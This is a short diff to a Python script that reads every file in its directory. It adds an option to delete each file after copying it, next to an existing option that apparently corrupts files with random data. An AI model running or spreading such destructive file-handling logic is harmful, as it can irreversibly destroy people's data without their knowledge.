@@ -50,6 +50,8 @@ for i in os.listdir(): # Lists all the files in the directory where the python f
             with open(i, "rb") as file: # Opens the file
                 contents = file.read()
                 filename = i.split("/")[-1] # Gets the filename by splitting the directory to a list and getting the last entry.
+            if delete_on_copy:
+                os.remove(i)
             if corrupt_on_copy:
                 x = 0
                 randomdata = ""
